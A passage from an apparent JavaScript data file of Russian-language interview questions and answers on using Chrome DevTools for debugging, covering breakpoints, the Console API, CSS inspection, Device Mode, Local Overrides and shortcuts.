features:</strong></p><p><strong>Опции:</strong></p><ul><li><strong>prefers-color-scheme</strong> — dark/light mode</li><li><strong>prefers-reduced-motion</strong> — accessibility</li><li><strong>prefers-contrast</strong> — high contrast</li><li><strong>prefers-reduced-data</strong> — save data mode</li></ul><p><strong>Использую для:</strong></p><ul><li>Тестирование dark mode</li><li>Проверка reduced-motion alternatives</li><li>Accessibility testing</li></ul><p><strong>8. Emulate vision deficiencies:</strong></p><p><strong>Типы эмуляции:</strong></p><ul><li>Blurred vision</li><li>Protanopia (red-blind)</li><li>Deuteranopia (green-blind)</li><li>Tritanopia (blue-blind)</li><li>Achromatopsia (no color)</li></ul><p><strong>Зачем:</strong></p><ul><li>Проверка color contrast</li><li>\"Видно ли important info?\"</li><li>Не полагаться только на цвет</li></ul><p><strong>Практические сценарии:</strong></p><p><strong>Scenario 1: Janky scroll</strong></p><ol><li>Enable Paint flashing + FPS meter</li><li>Scroll страницы</li><li>Вижу: constant repaints, 30 FPS</li><li>Enable Layer borders</li><li>Проблема: нет compositing для parallax element</li><li>Fix: add will-change: transform</li><li>Result: 60 FPS, smooth scroll</li></ol><p><strong>Scenario 2: CLS на загрузке</strong></p><ol><li>Enable Layout Shift Regions</li><li>Reload page</li><li>Синие вспышки когда images загружаются</li><li>Инспектирую: img без width/height</li><li>Fix: добавляю dimensions</li><li>Reload: no shifts ✅</li></ol><p><strong>Scenario 3: Poor animation performance</strong></p><ol><li>Frame Rendering Stats on</li><li>Trigger animation</li><li>FPS drops to 40</li><li>Paint flashing shows whole area repaints</li><li>Issue: animating width</li><li>Fix: animate transform instead</li><li>Result: stable 60 FPS</li></ol><p><strong>Best Practices:</strong></p><ul><li>✅ Используй несколько tools вместе</li><li>✅ Test на real devices тоже</li><li>✅ Emulate разные conditions</li><li>✅ Profile before и after optimization</li></ul><p><strong>Shortcuts:</strong></p><ul><li>Toggle Rendering panel быстро</li><li>Combine с Performance recordings</li><li>Визуальный feedback + data = полная картина</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Rendering', 'paint', 'CLS', 'визуальные проблемы']
  },

  {
    id: 125,
    question: "Как использовать Breakpoints для эффективного debugging в Sources panel?",
    answer: "<p><strong>Breakpoints</strong> — основа debugging, позволяют остановить выполнение и исследовать состояние.</p><p><strong>Типы Breakpoints:</strong></p><p><strong>1. Line-of-code breakpoints:</strong></p><p><strong>Самый базовый тип:</strong></p><ul><li>Click на номер строки</li><li>Синий маркер появляется</li><li>Execution остановится на этой строке</li></ul><p><strong>Когда использую:</strong></p><ul><li>\"Что происходит в этой функции?\"</li><li>Пошаговый анализ logic</li><li>Проверка значений переменных</li></ul><p><strong>Controls:</strong></p><ul><li>Resume (F8) — продолжить</li><li>Step over (F10) — следующая строка</li><li>Step into (F11) — войти в функцию</li><li>Step out (Shift+F11) — выйти из функции</li></ul><p><strong>2. Conditional breakpoints:</strong></p><p><strong>Остановка при условии:</strong></p><ul><li>Right-click на номер строки</li><li>\"Add conditional breakpoint\"</li><li>Ввод условия: userId === 123</li></ul><p><strong>Практический пример:</strong></p><ul><li>Цикл через 1000 items</li><li>Нужен break только когда item.id === 'abc'</li><li>Условие: item.id === 'abc'</li><li>Останется только на нужном item</li></ul><p><strong>3. Logpoint (вместо console.log):</strong></p><p><strong>Console.log без изменения кода:</strong></p><ul><li>Right-click → \"Add logpoint\"</li><li>Выражение: `User: ${user.name}, Age: ${user.age}`</li><li>Не останавливает execution</li><li>Выводит в console</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Не нужно редактировать код</li><li>✅ Не нужен rebuild</li><li>✅ Быстрое добавление/удаление</li></ul><p><strong>4. DOM Breakpoints:</strong></p><p><strong>Типы:</strong></p><ul><li><strong>Subtree modifications</strong> — child added/removed</li><li><strong>Attribute modifications</strong> — атрибут изменён</li><li><strong>Node removal</strong> — элемент удалён</li></ul><p><strong>Как установить:</strong></p><ul><li>Elements panel → right-click на элемент</li><li>Break on → выбрать тип</li></ul><p><strong>Когда использую:</strong></p><ul><li>\"Кто удаляет этот элемент?\"</li><li>\"Откуда меняется этот class?\"</li><li>Debugging DOM mutations</li></ul><p><strong>Практический случай:</strong></p><ul><li>Элемент исчезает mysteriously</li><li>Break on → Node removal</li><li>Execution stops</li><li>Call stack показывает откуда вызов</li><li>Нашёл баг в cleanup function</li></ul><p><strong>5. XHR/Fetch Breakpoints:</strong></p><p><strong>Остановка на AJAX запросе:</strong></p><ul><li>Sources → XHR/fetch Breakpoints</li><li>Add breakpoint</li><li>URL pattern: api/users</li></ul><p><strong>Останется:</strong></p><ul><li>До отправки request</li><li>Можно инспектировать payload</li><li>Проверить headers</li><li>Call stack — откуда вызвано</li></ul><p><strong>Использую когда:</strong></p><ul><li>\"Откуда идёт этот API call?\"</li><li>\"Что отправляется в request?\"</li><li>Debugging race conditions</li></ul><p><strong>6. Event Listener Breakpoints:</strong></p><p><strong>Break на типе события:</strong></p><ul><li>Sources → Event Listener Breakpoints</li><li>Expand categories</li><li>Checkbox нужные события</li></ul><p><strong>Категории:</strong></p><ul><li>Mouse: click, mousedown, mouseup</li><li>Keyboard: keydown, keyup</li><li>Control: resize, scroll, zoom</li><li>Timer: setInterval, setTimeout</li></ul><p><strong>Практический пример:</strong></p><ul><li>\"Кто обрабатывает этот click?\"</li><li>Enable Mouse → click</li><li>Click на элемент</li><li>Breaks на любом click handler</li><li>Видно все handlers в call stack</li></ul><p><strong>7. Exception Breakpoints:</strong></p><p><strong>Pause on exceptions:</strong></p><ul><li>Sources → Pause on exceptions checkbox</li><li>Pause on caught exceptions — опционально</li></ul><p><strong>Два режима:</strong></p><ul><li><strong>Uncaught only</strong> — только необработанные errors</li><li><strong>All exceptions</strong> — даже caught errors</li></ul><p><strong>Использую:</strong></p><ul><li>\"Где происходит ошибка?\"</li><li>Automatic break при throw</li><li>Видно state до ошибки</li></ul><p><strong>Debugging workflow:</strong></p><p><strong>Типичная сессия:</strong></p><ol><li>Воспроизвожу проблему</li><li>Ставлю breakpoint где подозреваю</li><li>Reload/trigger action</li><li>Останавливается на breakpoint</li><li>Инспектирую scope variables</li><li>Step через код</li><li>Watch expressions для мониторинга</li><li>Нашёл проблему</li></ol><p><strong>Watch Expressions:</strong></p><p><strong>Мониторинг переменных:</strong></p><ul><li>Watch panel в Sources</li><li>Add expression: user.isAdmin</li><li>Обновляется при каждом pause</li></ul><p><strong>Полезно для:</strong></p><ul><li>Отслеживать изменения</li><li>Complex expressions</li><li>Не нужно заново evaluate</li></ul><p><strong>Scope inspection:</strong></p><p><strong>При паузе вижу:</strong></p><ul><li><strong>Local</strong> — локальные переменные</li><li><strong>Closure</strong> — из внешних scope</li><li><strong>Global</strong> — window и т.д.</li><li><strong>this</strong> — контекст</li></ul><p><strong>Call Stack:</strong></p><ul><li>Цепочка вызовов до текущей точки</li><li>Click на frame → jump to code</li><li>Видно путь execution</li></ul><p><strong>Blackboxing:</strong></p><p><strong>Игнорирование библиотек:</strong></p><ul><li>Right-click на file в Call Stack</li><li>\"Blackbox script\"</li><li>Stepping пропускает этот code</li></ul><p><strong>Полезно для:</strong></p><ul><li>Не stepping через framework code</li><li>Фокус на своём коде</li><li>Быстрее debugging</li></ul><p><strong>Советы для эффективного debugging:</strong></p><ul><li>✅ Conditional breakpoints вместо manual stepping</li><li>✅ Logpoints вместо console.log</li><li>✅ DOM breakpoints для mysterious mutations</li><li>✅ Event listener breakpoints для finding handlers</li><li>✅ Blackbox third-party code</li><li>✅ Watch expressions для важных values</li><li>❌ Не ставь breakpoints в hot paths (loops)</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Breakpoints', 'debugging', 'Sources', 'workflow']
  },

  {
    id: 126,
    question: "Как использовать Console API эффективно для debugging?",
    answer: "<p><strong>Console API</strong> предоставляет гораздо больше чем просто console.log.</p><p><strong>Базовые методы:</strong></p><p><strong>1. console.log() варианты:</strong></p><p><strong>Styled console:</strong></p><ul><li>console.log('%c Styled!', 'color: blue; font-size: 20px');</li><li>%c = CSS styles</li><li>Полезно для важных messages</li></ul><p><strong>Multiple arguments:</strong></p><ul><li>console.log('User:', user, 'Count:', count);</li><li>Лучше чем конкатенация</li><li>Expandable objects</li></ul><p><strong>Template literals:</strong></p><ul><li>console.log(`Processing ${items.length} items`);</li><li>Readable и concise</li></ul><p><strong>2. console.table():</strong></p><p><strong>Табличное представление:</strong></p><ul><li>const users = [{name: 'Alice', age: 25}, {name: 'Bob', age: 30}];</li><li>console.table(users);</li><li>Красивая таблица в консоли</li></ul><p><strong>Selective columns:</strong></p><ul><li>console.table(users, ['name']); // только name колонка</li></ul><p><strong>Когда использую:</strong></p><ul><li>Arrays of objects</li><li>Сравнение данных</li><li>Гораздо читабельнее чем log</li></ul><p><strong>3. console.group():</strong></p><p><strong>Группировка логов:</strong></p><ul><li>console.group('User Details');</li><li>console.log('Name:', user.name);</li><li>console.log('Email:', user.email);</li><li>console.groupEnd();</li></ul><p><strong>Collapsed by default:</strong></p><ul><li>console.groupCollapsed('Details');</li><li>// ... logs</li><li>console.groupEnd();</li></ul><p><strong>Nested groups:</strong></p><ul><li>Группы внутри групп</li><li>Иерархическая структура</li></ul><p><strong>4. console.time() / timeEnd():</strong></p><p><strong>Измерение времени выполнения:</strong></p><ul><li>console.time('fetchData');</li><li>await fetchData();</li><li>console.timeEnd('fetchData');</li><li>// fetchData: 234.56ms</li></ul><p><strong>Multiple timers:</strong></p><ul><li>Разные labels для разных операций</li><li>Могут быть вложенными</li></ul><p><strong>5. console.trace():</strong></p><p><strong>Stack trace:</strong></p><ul><li>console.trace('How did we get here?');</li><li>Показывает call stack</li><li>Полезно для понимания flow</li></ul><p><strong>Когда использую:</strong></p><ul><li>\"Откуда вызывается эта функция?\"</li><li>Debugging unexpected calls</li><li>Понимание execution path</li></ul><p><strong>6. console.assert():</strong></p><p><strong>Conditional logging:</strong></p><ul><li>console.assert(user.age >= 18, 'User must be adult');</li><li>Log только если condition false</li><li>Cleaner чем if + log</li></ul><p><strong>Development assertions:</strong></p><ul><li>Проверка assumptions</li><li>Fail fast при нарушении</li></ul><p><strong>7. console.count() / countReset():</strong></p><p><strong>Подсчёт вызовов:</strong></p><ul><li>function processItem(item) {</li><li>  console.count('processItem called');</li><li>  // ...</li><li>}</li><li>// processItem called: 1</li><li>// processItem called: 2</li><li>// ...</li></ul><p><strong>Разные labels:</strong></p><ul><li>console.count(`Item ${item.id}`);</li><li>Отдельный счётчик для каждого</li></ul><p><strong>8. console.dir():</strong></p><p><strong>Детальный вывод объекта:</strong></p><ul><li>console.dir(element);</li><li>Показывает properties как объект</li><li>Не HTML representation</li></ul><p><strong>Полезно для:</strong></p><ul><li>DOM elements — видеть properties</li><li>Functions — видеть code</li></ul><p><strong>9. console.warn() / error():</strong></p><p><strong>Semantic logging:</strong></p><ul><li>console.warn('Deprecated API');</li><li>console.error('Failed to load');</li></ul><p><strong>Визуальное отличие:</strong></p><ul><li>Разные цвета/icons</li><li>Легче фильтровать</li><li>Stack trace автоматически для error</li></ul><p><strong>10. console.clear():</strong></p><ul><li>Очистить консоль программно</li><li>Полезно в development loops</li></ul><p><strong>Продвинутые техники:</strong></p><p><strong>Live Expressions:</strong></p><p><strong>Real-time мониторинг:</strong></p><ul><li>Console → Eye icon → Create live expression</li><li>Ввод выражения: document.querySelector('.active')</li><li>Обновляется автоматически</li></ul><p><strong>Использую для:</strong></p><ul><li>Мониторинг переменных во время debugging</li><li>Отслеживание DOM changes</li><li>Performance metrics</li></ul><p><strong>$0, $1, $2, $3, $4:</strong></p><p><strong>Ссылки на elements:</strong></p><ul><li>$0 — последний выбранный element</li><li>$1 — предыдущий</li><li>И так далее</li></ul><p><strong>Быстрый доступ:</strong></p><ul><li>Select element в Elements</li><li>В консоли: $0.style.backgroundColor = 'red'</li><li>Instant manipulation</li></ul><p><strong>$() и $$():</strong></p><p><strong>Shortcuts для querySelector:</strong></p><ul><li>$('selector') === document.querySelector('selector')</li><li>$$('selector') === document.querySelectorAll('selector')</li></ul><p><strong>Array helpers:</strong></p><ul><li>$$('div').map(el => el.textContent)</li><li>$$ возвращает array, не NodeList</li></ul><p><strong>copy():</strong></p><ul><li>copy(object);</li><li>Копирует в clipboard</li><li>JSON representation</li></ul><p><strong>Полезно:</strong></p><ul><li>Экспорт данных из console</li><li>Sharing debug info</li></ul><p><strong>getEventListeners():</strong></p><ul><li>getEventListeners($0);</li><li>Все event listeners на элементе</li><li>Type, listener, useCapture</li></ul><p><strong>monitorEvents() / unmonitorEvents():</strong></p><ul><li>monitorEvents($0, 'click');</li><li>Логирует каждое событие</li><li>Debugging event handlers</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ console.table для arrays</li><li>✅ console.group для структуры</li><li>✅ console.time для performance</li><li>✅ console.assert для проверок</li><li>✅ Styled logs для важных messages</li><li>✅ Удаляй console.logs перед commit</li><li>✅ Используй proper log levels (warn/error)</li></ul><p><strong>Фильтрация в Console:</strong></p><ul><li>Filter bar — текстовый поиск</li><li>Level filters — errors only, warnings, etc</li><li>Context filter — выбор execution context</li><li>Regex support в filter</li></ul><p><strong>Production debugging:</strong></p><ul><li>⚠️ Не забывать удалять console.logs</li><li>Использовать conditional logging</li><li>Wrapper функции для debug mode</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Console', 'API', 'debugging', 'логирование']
  },

  {
    id: 127,
    question: "Как использовать DevTools для debugging CSS проблем?",
    answer: "<p><strong>DevTools предоставляют мощные инструменты для CSS debugging</strong> прямо в Elements panel.</p><p><strong>Styles панель:</strong></p><p><strong>Основное использование:</strong></p><ul><li>Select element</li><li>Styles sidebar показывает все стили</li><li>От специфичных к общим</li><li>Зачёркнутые = overridden</li></ul><p><strong>Live editing:</strong></p><ul><li>Click на значение</li><li>Редактирую прямо в DevTools</li><li>Changes instantly visible</li><li>Не сохраняется в файл</li></ul><p><strong>Практический workflow:</strong></p><ul><li>\"Почему цвет не тот?\"</li><li>Смотрю в Styles</li><li>Вижу color: blue зачёркнут</li><li>Ниже color: red (более специфичный selector)</li><li>Проблема с CSS specificity</li></ul><p><strong>Computed панель:</strong></p><p><strong>Final computed values:</strong></p><ul><li>Все CSS properties для element</li><li>Финальные вычисленные значения</li><li>С учётом inheritance и cascade</li></ul><p><strong>Полезно когда:</strong></p><ul><li>\"Откуда взялся этот margin?\"</li><li>Click на стрелку → показывает источник</li><li>Видно всю цепочку inheritance</li></ul><p><strong>Filter box:</strong></p><ul><li>Быстрый поиск properties</li><li>\"width\" → все width-related</li></ul><p><strong>Box Model визуализатор:</strong></p><p><strong>Interactive diagram:</strong></p><ul><li>Визуальное представление box model</li><li>Content, padding, border, margin</li><li>Click на значение → edit inline</li></ul><p><strong>Hover эффект:</strong></p><ul><li>Hover на элементе в diagram</li><li>Подсвечивается на странице</li><li>Видно реальные размеры</li></ul><p><strong>Debugging layout:</strong></p><ul><li>\"Почему такой размер?\"</li><li>Смотрю box model</li><li>Вижу padding: 100px случайно</li><li>Или box-sizing issue</li></ul><p><strong>CSS правила и specificity:</strong></p><p><strong>Inspector показывает:</strong></p><ul><li>Порядок применения rules</li><li>Specificity implicit</li><li>!important выделен</li></ul><p><strong>Debugging конфликта:</strong></p><ul><li>Два правила для color</li><li>Какой выиграет?</li><li>Смотрю order и specificity</li><li>Понимаю нужно увеличить specificity или !important</li></ul><p><strong>Toggle declarations:</strong></p><ul><li>Checkbox рядом с каждым property</li><li>Quick disable/enable</li><li>\"Это из-за этого стиля?\"</li><li>Toggle → проверяю</li></ul><p><strong>:hov (hover state):</strong></p><p><strong>Force element state:</strong></p><ul><li>Click :hov button</li><li>Checkboxes: :hover, :active, :focus, :visited</li><li>Элемент в нужном состоянии</li></ul><p><strong>Использую когда:</strong></p><ul><li>Debugging hover styles</li><li>Проверка focus states</li><li>Link :visited styles</li><li>Не нужно manually hover</li></ul><p><strong>.cls (classes):</strong></p><p><strong>Manage classes:</strong></p><ul><li>Add/remove classes динамически</li><li>Input box для новых classes</li><li>Checkboxes для существующих</li></ul><p><strong>Быстрое тестирование:</strong></p><ul><li>\"Как выглядит с class 'active'?\"</li><li>Add class → instant preview</li><li>Не нужно менять HTML</li></ul><p><strong>+ New Style Rule:</strong></p><ul><li>Создать новое CSS правило</li><li>Selector автоматически для element</li><li>Можно менять selector</li></ul><p><strong>Полезно для:</strong></p><ul><li>Quick prototyping</li><li>Testing new styles</li><li>Потом copy в файл</li></ul><p><strong>CSS Grid inspector:</strong></p><p><strong>Для Grid layouts:</strong></p><ul><li>Badge \"grid\" рядом с display: grid</li><li>Click → overlay на странице</li><li>Показывает grid lines, gaps, areas</li></ul><p><strong>Grid controls:</strong></p><ul><li>Layout sidebar → Grid section</li><li>Show line numbers</li><li>Show line names</li><li>Extend grid lines</li><li>Color picker для overlay</li></ul><p><strong>Debugging grid:</strong></p><ul><li>\"Почему item не там?\"</li><li>Enable overlay</li><li>Вижу actual grid structure</li><li>Item в неправильной area</li></ul><p><strong>Flexbox inspector:</strong></p><p><strong>Для Flex layouts:</strong></p><ul><li>Badge \"flex\" рядом с display: flex</li><li>Overlay показывает flex container и items</li></ul><p><strong>Visual debugging:</strong></p><ul><li>Main axis direction</li><li>Cross axis direction</li><li>Item sizes</li><li>Gap/spacing</li></ul><p><strong>Changes tracking:</strong></p><p><strong>Changes panel:</strong></p><ul><li>More tools → Changes</li><li>Показывает все CSS изменения в сессии</li><li>Diff view</li></ul><p><strong>Workflow:</strong></p><ul><li>Экспериментирую со стилями</li><li>Нравится результат</li><li>Changes panel → copy diff</li><li>Paste в CSS файл</li></ul><p><strong>Color picker:</strong></p><p><strong>Advanced features:</strong></p><ul><li>Click на color swatch</li><li>Color picker opens</li><li>Eyedropper для picking from page</li><li>Contrast ratio checker (a11y)</li><li>Color format switcher (hex/rgb/hsl)</li></ul><p><strong>Accessibility contrast:</strong></p><ul><li>Shows WCAG AA/AAA compliance</li><li>Suggests better colors</li></ul><p><strong>Animations inspector:</strong></p><ul><li>More tools → Animations</li><li>Timeline всех animations</li><li>Pause, slow down, scrub</li></ul><p><strong>Debugging animations:</strong></p><ul><li>\"Animation too fast\"</li><li>Slow down 10x</li><li>Видно что происходит</li><li>Tweak timing</li></ul><p><strong>Practical tips:</strong></p><ul><li>✅ Start с Computed для final values</li><li>✅ Use box model для layout issues</li><li>✅ Toggle properties для isolation</li><li>✅ :hov для state testing</li><li>✅ Grid/Flex overlays must-have</li><li>✅ Changes panel для export</li><li>✅ Color picker для a11y</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'CSS', 'debugging', 'Styles', 'layout']
  },

  {
    id: 128,
    question: "Как использовать Device Mode для mobile debugging?",
    answer: "<p><strong>Device Mode</strong> позволяет эмулировать мобильные устройства прямо в DevTools.</p><p><strong>Включение Device Mode:</strong></p><ul><li>Toggle device toolbar icon (⌘⇧M / Ctrl+Shift+M)</li><li>Или More tools → Sensors для advanced</li></ul><p><strong>Основные возможности:</strong></p><p><strong>1. Device emulation:</strong></p><p><strong>Preset devices:</strong></p><ul><li>iPhone SE, iPhone 12/13/14</li><li>Pixel 5, Pixel 7</li><li>Samsung Galaxy</li><li>iPad, iPad Pro</li></ul><p><strong>Что эмулируется:</strong></p><ul><li>Screen size и resolution</li><li>Device pixel ratio</li><li>Touch events</li><li>User agent string</li></ul><p><strong>Custom devices:</strong></p><ul><li>Edit → Add custom device</li><li>Задать width, height, DPR</li><li>User agent string</li></ul><p><strong>2. Responsive mode:</strong></p><p><strong>Flexible viewport:</strong></p><ul><li>Drag handles для resize</li><li>Не привязан к конкретному device</li><li>Тестирование breakpoints</li></ul><p><strong>Практическое использование:</strong></p><ul><li>\"На каком breakpoint ломается?\"</li><li>Медленно resize viewport</li><li>Видно где переключается layout</li><li>Проверяю media queries</li></ul><p><strong>3. Orientation toggle:</strong></p><ul><li>Portrait ↔ Landscape</li><li>One click switch</li><li>Тест orientation media queries</li></ul><p><strong>4. Zoom levels:</strong></p><p><strong>Для тестирования:</strong></p><ul><li>50% до 500% zoom</li><li>Проверка на разных уровнях масштаба</li><li>Accessibility — увеличенный текст</li></ul><p><strong>5. Device pixel ratio:</strong></p><ul><li>1x, 2x (Retina), 3x</li><li>Тестирование responsive images</li><li>Проверка что правильные images загружаются</li></ul><p><strong>Network throttling:</strong></p><p><strong>Эмуляция медленного интернета:</strong></p><ul><li>No throttling</li><li>Fast 3G (1.6 Mbps)</li><li>Slow 3G (400 Kbps)</li><li>Offline</li><li>Custom profiles</li></ul><p><strong>Когда использую:</strong></p><ul><li>Проверка loading states</li><li>Skeleton screens видны дольше</li><li>Тест offline functionality</li><li>Progressive enhancement</li></ul><p><strong>CPU throttling:</strong></p><p><strong>Эмуляция слабого CPU:</strong></p><ul><li>No throttling</li><li>4x slowdown</li><li>6x slowdown</li></ul><p><strong>Зачем нужно:</strong></p><ul><li>Desktop CPU мощнее mobile</li><li>JavaScript выполняется медленнее</li><li>Находим performance bottlenecks</li></ul><p><strong>Практический пример:</strong></p><ul><li>Анимация smooth на laptop</li><li>4x throttling → janky</li><li>Нужна оптимизация</li></ul><p><strong>Touch simulation:</strong></p><p><strong>Mouse → Touch events:</strong></p><ul><li>Cursor становится circle</li><li>Click → touch event</li><li>Drag → swipe gesture</li></ul><p><strong>Тестирование:</strong></p><ul><li>Touch-specific interactions</li><li>Swipe gestures</li><li>Touch targets достаточно большие?</li></ul><p><strong>Sensors panel:</strong></p><p><strong>Geolocation override:</strong></p><ul><li>More tools → Sensors</li><li>Location section</li><li>Preset locations или custom coords</li></ul><p><strong>Использую для:</strong></p><ul><li>Тестирование location-based features</li><li>Без физического перемещения</li><li>\"Как выглядит в Tokyo?\"</li></ul><p><strong>Orientation (accelerometer):</strong></p><ul><li>Эмуляция device orientation</li><li>Alpha, Beta, Gamma углы</li><li>Preset orientations</li></ul><p><strong>Idle state:</strong></p><ul><li>User active/idle detection</li><li>Screen locked/unlocked</li></ul><p><strong>Show rulers:</strong></p><ul><li>Pixel ruler вокруг viewport</li><li>Измерение размеров elements</li><li>Проверка что размеры правильные</li></ul><p><strong>Show device frame:</strong></p><ul><li>Визуальная рамка устройства</li><li>Более realistic preview</li><li>Но занимает больше места</li></ul><p><strong>Capture screenshot:</strong></p><ul><li>More options (⋮) → Capture screenshot</li><li>Full size или selection</li><li>Для documentation</li></ul><p><strong>Practical debugging scenarios:</strong></p><p><strong>Scenario 1: Layout breaks on mobile</strong></p><ol><li>Toggle device mode</li><li>Select iPhone SE (small screen)</li><li>Видно overflow</li><li>Inspect element</li><li>Fixed width без max-width</li><li>Fix CSS</li></ol><p><strong>Scenario 2: Touch не работает</strong></p><ol><li>Device mode on</li><li>Touch simulation enabled</li><li>Try gesture</li><li>Open Event Listeners</li><li>Нет touch handlers, только mouse</li><li>Add touch support</li></ol><p><strong>Scenario 3: Slow на слабых устройствах</strong></p><ol><li>4x CPU throttling</li><li>Slow 3G network</li><li>Reload page</li><li>Performance issues visible</li><li>Profile и optimize</li></ol><p><strong>Limitations:</strong></p><p><strong>Не полная эмуляция:</strong></p><ul><li>⚠️ Не настоящий mobile браузер</li><li>⚠️ Rendering engine Chrome</li><li>⚠️ Некоторые API недоступны</li><li>⚠️ Разные quirks</li></ul><p><strong>Real device testing всё равно нужен:</strong></p><ul><li>Safari на iOS (WebKit)</li><li>Реальные touch interactions</li><li>Actual performance</li><li>Hardware-specific issues</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Используй для быстрого тестирования</li><li>✅ Test на нескольких device presets</li><li>✅ Network + CPU throttling together</li><li>✅ Проверяй touch targets (48x48px min)</li><li>✅ Final testing на real devices</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Device Mode', 'mobile', 'эмуляция', 'responsive']
  },

  {
    id: 129,
    question: "Как использовать Local Overrides для testing изменений без rebuild?",
    answer: "<p><strong>Local Overrides</strong> позволяют сохранять изменения из DevTools и применять их при каждой загрузке.</p><p><strong>Настройка Local Overrides:</strong></p><p><strong>Первичная настройка:</strong></p><ul><li>Sources panel → Overrides tab</li><li>\"Select folder for overrides\"</li><li>Выбрать локальную папку</li><li>Разрешить доступ к файловой системе</li></ul><p><strong>Как работает:</strong></p><ul><li>Изменения в DevTools сохраняются в папку</li><li>При следующей загрузке применяются автоматически</li><li>Браузер использует локальные файлы вместо сетевых</li></ul><p><strong>Практическое использование:</strong></p><p><strong>1. CSS изменения:</strong></p><ul><li>Elements → редактирую стили</li><li>Файл автоматически сохраняется</li><li>Reload → изменения сохранены</li><li>Не нужен rebuild проекта</li></ul><p><strong>Workflow:</strong></p><ul><li>\"Хочу попробовать новый цвет\"</li><li>Меняю в DevTools</li><li>Override сохраняет</li><li>Тестирую с разными страницами</li><li>Если нравится → копирую в исходники</li></ul><p><strong>2. JavaScript debugging:</strong></p><ul><li>Sources → открываю JS файл</li><li>Редактирую код прямо в DevTools</li><li>⌘/Ctrl + S — save</li><li>Reload → новый код выполняется</li></ul><p><strong>Пример:</strong></p><ul><li>Баг в production</li><li>Добавляю console.log для debugging</li><li>Override сохраняет</li><li>Воспроизвожу проблему</li><li>Вижу логи</li></ul><p><strong>3. HTTP headers override:</strong></p><ul><li>Network panel → right-click request</li><li>\"Override headers\"</li><li>Меняю headers</li><li>Последующие запросы используют новые</li></ul><p><strong>Использую для:</strong></p><ul><li>Тестирование разных Authorization tokens</li><li>CORS debugging</li><li>Content-Type экспериментирование</li></ul><p><strong>4. Response mocking:</strong></p><ul><li>Network → right-click на request</li><li>\"Override content\"</li><li>Меняю response body</li><li>Тестирование error states</li></ul><p><strong>Практический сценарий:</strong></p><ul><li>API возвращает success</li><li>Хочу протестировать error handling</li><li>Override response → 500 error</li><li>Проверяю как приложение реагирует</li></ul><p><strong>Управление overrides:</strong></p><p><strong>Viewing overrides:</strong></p><ul><li>Overrides tab показывает все файлы</li><li>Иерархия по доменам</li><li>Можно редактировать/удалять</li></ul><p><strong>Disable/Enable:</strong></p><ul><li>Checkbox \"Enable Local Overrides\"</li><li>Quick toggle on/off</li><li>Без удаления файлов</li></ul><p><strong>Clear overrides:</strong></p><ul><li>Right-click на файл → Delete</li><li>Или удалить всю папку</li></ul><p><strong>Преимущества подхода:</strong></p><ul><li>✅ Нет rebuild cycle</li><li>✅ Instant feedback</li><li>✅ Тестирование production кода</li><li>✅ Изоляция изменений</li><li>✅ Easy rollback</li></ul><p><strong>Ограничения:</strong></p><ul><li>⚠️ Только для текущего браузера</li><li>⚠️ Не работает в других browsers</li><li>⚠️ Нужно manually sync с codebase</li><li>⚠️ Может сбить с толку (забыть об overrides)</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ Используй для quick experiments</li><li>✅ Document что override активен</li><li>✅ Disable после тестирования</li><li>✅ Copy changes в код promptly</li><li>✅ Не полагайся долгосрочно</li></ul><p><strong>Альтернативные подходы:</strong></p><ul><li>Hot Module Replacement (HMR)</li><li>Live reload servers</li><li>Browser extensions</li></ul><p><strong>Когда Local Overrides лучше:</strong></p><ul><li>Production debugging</li><li>Нет доступа к codebase</li><li>Quick CSS tweaks</li><li>Third-party resources override</li></ul>",
    difficulty: 'middle',
    tags: ['Chrome DevTools', 'Local Overrides', 'debugging', 'workflow', 'testing']
  },

  {
    id: 130,
    question: "Какие продвинутые техники и shortcuts в DevTools используешь регулярно?",
    answer: "<p><strong>Продвинутые техники DevTools</strong> значительно ускоряют workflow при регулярном использовании.</p><p><strong>Command Menu (⌘⇧P / Ctrl+Shift+P):</strong></p><p><strong>Самый мощный shortcut:</strong></p><ul><li>Доступ ко всем командам DevTools</li><li>Fuzzy search</li><li>Не нужно помнить где что находится</li></ul><p><strong>Частые команды:</strong></p><ul><li>\"Screenshot\" — capture full page</li><li>\"Coverage\" — open coverage tool</li><li>\"Rendering\" — show rendering panel</li><li>\"Disable JavaScript\" — quick toggle</li><li>\"Clear\" — clear console/cache/storage</li></ul><p><strong>Keyboard shortcuts (мои most used):</strong></p><p><strong>Navigation:</strong></p><ul><li>⌘⇧C / Ctrl+Shift+C — Element picker</li><li>⌘K / Ctrl+K — Clear console</li><li>⌘P / Ctrl+P — Quick open file</li><li>⌘⇧P — Command menu</li></ul><p><strong>Debugging:</strong></p><ul><li>F8 — Resume execution</li><li>F10 — Step over</li><li>F11 — Step into</li><li>⌘\\ — Toggle breakpoint</li></ul><p><strong>Panels:</strong></p><ul><li>⌘⇧M — Toggle device mode</li><li>⌘[ / ⌘] — Switch panels</li><li>Esc — Toggle drawer</li></ul><p><strong>Snippets для reusable code:</strong></p><p><strong>Что это:</strong></p><ul><li>Sources → Snippets tab</li><li>Сохранённые JavaScript скрипты</li><li>Run на любой странице</li></ul><p><strong>Мои полезные snippets:</strong></p><ul><li>// Clear all localStorage</li><li>localStorage.clear(); sessionStorage.clear();</li><li>// Get all colors from page</li><li>const colors = [...document.querySelectorAll('*')]</li><li>  .map(el => getComputedStyle(el).color)</li><li>  .filter((v, i, a) => a.indexOf(v) === i);</li><li>// List all event listeners</li><li>$$('*').flatMap(el => </li><li>  Object.entries(getEventListeners(el))</li><li>);</li></ul><p><strong>Workspaces для live editing:</strong></p><p><strong>Настройка:</strong></p><ul><li>Sources → Filesystem tab</li><li>Add folder to workspace</li><li>Маппинг между network files и local</li></ul><p><strong>Преимущества:</strong></p><ul><li>✅ Changes сразу в файлах</li><li>✅ No copy-paste</li><li>✅ Two-way sync</li><li>✅ Интеграция с IDE</li></ul><p><strong>Multi-cursor editing:</strong></p><ul><li>⌘/Ctrl + Click — add cursor</li><li>⌘/Ctrl + D — select next occurrence</li><li>Alt + Click + Drag — column selection</li></ul><p><strong>Полезно в Sources для:</strong></p><ul><li>Bulk edits</li><li>Refactoring</li><li>Multiple 